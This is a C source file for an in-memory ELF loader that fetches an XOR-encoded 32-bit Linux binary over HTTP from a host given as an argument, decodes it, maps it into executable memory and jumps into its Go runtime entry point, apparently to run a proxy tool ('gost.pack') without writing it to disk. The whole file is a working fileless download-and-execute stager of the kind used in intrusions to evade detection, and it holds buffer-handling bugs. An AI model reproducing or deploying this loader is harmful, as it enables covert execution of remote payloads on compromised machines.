#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <libelf.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <arpa/inet.h>
#include <assert.h>
#include <netdb.h> /* getprotobyname */
#include <netinet/in.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <unistd.h>


#include "loader.h"


/*
 * Static ELF Loader for x86 Linux
 * 
 */

void print_e(char* msg)
{
    fputs(msg, stderr);
}

void unpack(char* elf_start, unsigned int size)
{
    printf("[*] Unpacking in memory...\n");
    for(unsigned int i = 0; i <= size; i++)
    {
        elf_start[i] ^= UNPACK_KEY;
    }
}

unsigned int getfilesize(char* path) 
{ 
    FILE* fp = fopen(path, "r"); 
    if (fp == NULL) { 
        print_e("[getfilesize] File Not Found!\n"); 
        exit(0);
    } 
  
    fseek(fp, 0L, SEEK_END); 
    long int res = ftell(fp); 
    fclose(fp); 
  
    return res; 
} 

int is_image_valid(Elf32_Ehdr* hdr)
{
    if(hdr->e_ident[EI_MAG0] == ELFMAG0 &&  // 0x7f
       hdr->e_ident[EI_MAG1] == ELFMAG1 &&  // 'E'
       hdr->e_ident[EI_MAG2] == ELFMAG2 &&  // 'L'
       hdr->e_ident[EI_MAG3] == ELFMAG3 &&  // 'F'
       hdr->e_type == ET_EXEC) {
        return -1;
    } 
    else {
        return 0;
    }
    
}


void* symbol_resolve(char* name, Elf32_Shdr* shdr, char* strings, char* elf_start)
{
    Elf32_Sym* syms = (Elf32_Sym*)(elf_start + shdr->sh_offset);
    int i;
    for(i = 0; i < shdr->sh_size / sizeof(Elf32_Sym); i += 1) {
        if (strcmp(name, strings + syms[i].st_name) == 0) {
           /*
            * In static ELF  files,  the st_value  member  is 
            * not an offset but rather a virtual address itself
            * hence,  it's not necessary  to calculate  an RVA.
            */
            return (void *)syms[i].st_value; 
        }
    }
    return NULL;
}

void* load_elf_image(char* elf_start, unsigned int size)
{
    // declaring local vars
    Elf32_Ehdr *hdr     = NULL;
    Elf32_Phdr *phdr    = NULL;
    Elf32_Shdr *shdr    = NULL;
    char *strings       = NULL; // string table           (offset in file)
    char *start         = NULL; // start of a segment     (offset in file)
    char *target_addr   = NULL; // base addr of a segment (in virtual memory)
    void *entry         = NULL; // entry point            (in virtual memory)
    int i               = 0;    // counter for program headers

    // unpacking
    unpack(elf_start, size);

    // start proccessing
    hdr = (Elf32_Ehdr *) elf_start;
    printf("[*] Validating ELF...\n");

    if(!is_image_valid(hdr)) {
        print_e("[load_elf_image] invalid ELF image\n");
        return 0;
    }

    printf("[*] Loading/mapping segments...\n");
    phdr = (Elf32_Phdr *)(elf_start + hdr->e_phoff);

    for(i=0; i < hdr->e_phnum; ++i) {
        if(phdr[i].p_type != PT_LOAD) {
                continue;
        }
 
        if(phdr[i].p_filesz > phdr[i].p_memsz) {
                print_e("[load_elf_image] p_filesz > p_memsz\n");
                return 0;
        }

        if(!phdr[i].p_filesz) {
                continue;
        }

        start = elf_start + phdr[i].p_offset;
        target_addr = (char* )phdr[i].p_vaddr;

        if (LAST_LOADABLE_SEG(phdr, i)) {
            phdr[i].p_memsz += 0x1000; // extra-page padding
        }

        // allocating memory for the segment
	    mmap(target_addr, phdr[i].p_memsz, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0); // hotfix patched by BigShaq

        // moving things around *poof* 
        memmove(target_addr,start,phdr[i].p_filesz);

        // setting permissions
            if(!(phdr[i].p_flags & PF_W)) {
                    mprotect((unsigned char *) target_addr,
                              phdr[i].p_memsz,
                              PROT_READ);
            }

            if(phdr[i].p_flags & PF_X) {
                    mprotect((unsigned char *) target_addr,
                            phdr[i].p_memsz,
                            PROT_EXEC);
            }
    }

    printf("[*] Looking for a .symtab section header...\n");

    shdr = (Elf32_Shdr *)(elf_start + hdr->e_shoff);

    for(i=0; i < hdr->e_shnum; ++i) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            printf("[*] SHT_SYMTAB entry was found, looking for main() ...\n");

            strings = elf_start + shdr[shdr[i].sh_link].sh_offset;
            entry = symbol_resolve("_rt0_386_linux", shdr + i, strings, elf_start); 
            //entry = symbol_resolve("main.main", shdr + i, strings, elf_start); 

	        printf("[*] main at: %p\n", entry);
            break;
        }
    }

   return entry;
}



struct MemoryStruct {
  char *memory;
  size_t size;
};
 
char* strrstr(const char* src, const char substr)
{
if(src == NULL)
return NULL;


int n = strlen(src);
char *ret = malloc(n);
int i;
for(i = 0;i < n; i++){
    if(src[i] == substr){
        break;
    }
    ret[i] = src[i];
    
}
return ret;


}
 
int main(int argc, char** argv, char** envp)
{
    int (*ptr)(char **, int, int,int,int,int);
    int result;
  
    //  a.b.com.cn/gost.pack
    


    int a,aa=0;

    char *uri=strpbrk(argv[1],"/");
    // if *uri == NULL{
    //     printf("input uri error");
    // }
    printf("uri: %s\n",uri);
    char *hosts = strrstr(argv[1], '/');
    printf("host: %s\n",hosts);
    char *temp1 = strchr(argv[1], ':');
    char *temp2 = strchr(argv[1], '/');
    char string_int[5];
    if (temp1 != NULL && temp2 != NULL){
        for(a=temp1-argv[1]+1;a<temp2-argv[1];a++){
            string_int[aa] = argv[1][a];
            aa ++;
        }
        
        hosts = strrstr(hosts, ':');
        printf("host: %s\n",strrstr(hosts, ':'));
    } else {
        strcpy(string_int, "80");

    }
    printf("port: %d\n",atoi(string_int));
    



    char buffer[BUFSIZ];
    enum CONSTEXPR { MAX_REQUEST_LEN = 1024};
    char request[MAX_REQUEST_LEN];
    char request_template[] = "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection:close\r\n\r\n";
    struct protoent *protoent;
    // char *hostname = "localhost";
    char *hostname = hosts;
    in_addr_t in_addr;
    int request_len;
    int socket_file_descriptor;
    ssize_t nbytes_total, nbytes_last;
    struct hostent *hostent;
    struct sockaddr_in sockaddr_in;
    unsigned short server_port = atoi(string_int);


    request_len = snprintf(request, MAX_REQUEST_LEN, request_template, uri, hostname);
    if (request_len >= MAX_REQUEST_LEN) {
        fprintf(stderr, "request length large: %d\n", request_len);
        exit(EXIT_FAILURE);
    }

    /* Build the socket. */
    protoent = getprotobyname("tcp");
    if (protoent == NULL) {
        perror("getprotobyname");
        exit(EXIT_FAILURE);
    }
    socket_file_descriptor = socket(AF_INET, SOCK_STREAM, protoent->p_proto);
    if (socket_file_descriptor == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    /* Build the address. */
    hostent = gethostbyname(hostname);
    if (hostent == NULL) {
        fprintf(stderr, "error: gethostbyname(\"%s\")\n", hostname);
        exit(EXIT_FAILURE);
    }
    in_addr = inet_addr(inet_ntoa(*(struct in_addr*)*(hostent->h_addr_list)));
    if (in_addr == (in_addr_t)-1) {
        fprintf(stderr, "error: inet_addr(\"%s\")\n", *(hostent->h_addr_list));
        exit(EXIT_FAILURE);
    }
    sockaddr_in.sin_addr.s_addr = in_addr;
    sockaddr_in.sin_family = AF_INET;
    sockaddr_in.sin_port = htons(server_port);

    /* Actually connect. */
    if (connect(socket_file_descriptor, (struct sockaddr*)&sockaddr_in, sizeof(sockaddr_in)) == -1) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    /* Send HTTP request. */
    nbytes_total = 0;
    while (nbytes_total < request_len) {
        nbytes_last = write(socket_file_descriptor, request + nbytes_total, request_len - nbytes_total);
        if (nbytes_last == -1) {
            perror("write");
            exit(EXIT_FAILURE);
        }
        nbytes_total += nbytes_last;
    }

    /* Read the response. */
    char *buffer_buffer = NULL;
    unsigned int i = 0;
    unsigned long LEN = 600;
    unsigned long cur_size = 0;
    buffer_buffer = (char*)malloc(sizeof(char)*LEN);

    // fprintf(stderr, "debug: before first read\n");
    // nbytes_total = read(socket_file_descriptor, buffer_buffer, LEN);
    // write(STDOUT_FILENO, buffer_buffer, nbytes_total);
    while ((nbytes_total = read(socket_file_descriptor, buffer, BUFSIZ)) > 0) {
        // fprintf(stderr, "debug: after a read\n");
        for(i=0;i < nbytes_total; i++){
            buffer_buffer[cur_size + i] = buffer[i];
        }
        cur_size += nbytes_total;
        LEN = LEN + BUFSIZ;
        buffer_buffer = (char*) realloc(buffer_buffer, LEN);
    }
    
    char *s = strstr(buffer_buffer, "\r\n\r\n");
    int count = 0;
    for(i=0;i < LEN; i++){
            if (buffer_buffer + i < s + 4){
                count ++;
                continue;
            }
            break;

    }
    unsigned int filesize = (unsigned int)(LEN - count);
    char* buf = malloc(filesize);
    for(i=0;i < filesize; i++){
        buf[i] = buffer_buffer[count + i];
    }
    // for(i=0;i < filesize; i++){
    //     printf("%c",buf[i]);
    // }
    // exit(1);
    // fprintf(stderr, "debug: after last read\n");
    if (nbytes_total == -1) {
        perror("read");
        exit(EXIT_FAILURE);
    }

    close(socket_file_descriptor);
    /*
     * Now, our chunk.memory points to a memory block that is chunk.size
     * bytes big and contains the remote file.
     *
     * Do something nice with it!
     */
    ptr = load_elf_image(buf, filesize);
    if(ptr) {
        printf("[*] jumping to %p \n----------------\n", ptr);

    asm volatile(
        "push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		//"push %2\n"
		//"push %1\n"
        "movl %3, %%edx\n"
        "movl $2, %%eax\n"
        "movl %1,%%edi\n"
        "LOOP:\n"
        "movl %2, %%ecx\n"
        "cmp %%edi, %%eax\n"
        "je SOMTHING\n"
        "movl %%edi, %%ebx\n"
        "imul $4,%%ebx\n"
        "add %%ebx, %%ecx\n"
        "sub $4, %%ecx\n"
        // "movl (%%ecx,%%ebx,4), %%esi\n"
        "push (%%ecx)\n"
        "dec %%edi\n"
        "jmp LOOP\n"
        "SOMTHING:\n"
        //push last one
        "movl %%edi, %%ebx\n"
        "imul $4,%%ebx\n"
        "add %%ebx, %%ecx\n"
        "sub $4, %%ecx\n"
        "push (%%ecx)\n"
        // "push %2\n"
        "movl %1, %%ecx\n"
        "dec %%ecx\n"
        "push %%ecx\n"
		"movl $0, %%eax\n"
		"movl $0, %%ebx\n"
		"movl $0, %%ecx\n"
		"movl $0, %%ebp\n"
		"movl $0, %%esi\n"
		"movl $0, %%edi\n"
		
		// "push $1\n"
        
        "jmp %%edx"
		: "=r" (result)
		: "rm" (argc), "pm" (argv), "p" (ptr)
			);
        //ptr(argv,argc,argc,argc,argc,argc); // https://youtu.be/SF3UZRxQ7Rs 
    } 
    else {
        printf("[!] Quitting...\n");
    }
  
 
  return 0;
}


/*

int main1(int argc, char** argv, char** envp)
{
    int (*ptr)(char **, int, int,int,int,int);
    FILE* elf            = fopen(argv[1], "rb");
    unsigned int filesz  = getfilesize(argv[1]);
    char* buf            = malloc(filesz);

    int result;
    fread(buf, filesz, 1, elf);
    fclose(elf);
    ptr = load_elf_image(buf, filesz);
    free(buf);

    if(ptr) {
        printf("[*] jumping to %p \n----------------\n", ptr);

    asm volatile(
        "push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		"push $0\n"
		//"push %2\n"
		//"push %1\n"
        "movl %3, %%edx\n"
        "movl $2, %%eax\n"
        "movl %1,%%edi\n"
        "LOOP:\n"
        "movl %2, %%ecx\n"
        "cmp %%edi, %%eax\n"
        "je SOMTHING\n"
        "movl %%edi, %%ebx\n"
        "imul $4,%%ebx\n"
        "add %%ebx, %%ecx\n"
        "sub $4, %%ecx\n"
        // "movl (%%ecx,%%ebx,4), %%esi\n"
        "push (%%ecx)\n"
        "dec %%edi\n"
        "jmp LOOP\n"
        "SOMTHING:\n"
        //push last one
        "movl %%edi, %%ebx\n"
        "imul $4,%%ebx\n"
        "add %%ebx, %%ecx\n"
        "sub $4, %%ecx\n"
        "push (%%ecx)\n"
        // "push %2\n"
        "movl %1, %%ecx\n"
        "dec %%ecx\n"
        "push %%ecx\n"
		"movl $0, %%eax\n"
		"movl $0, %%ebx\n"
		"movl $0, %%ecx\n"
		"movl $0, %%ebp\n"
		"movl $0, %%esi\n"
		"movl $0, %%edi\n"
		
		// "push $1\n"
        
        "jmp %%edx"
		: "=r" (result)
		: "rm" (argc), "pm" (argv), "p" (ptr)
			);
        //ptr(argv,argc,argc,argc,argc,argc); // https://youtu.be/SF3UZRxQ7Rs 
    } 
    else {
        printf("[!] Quitting...\n");
    }
    return 0;
}
*/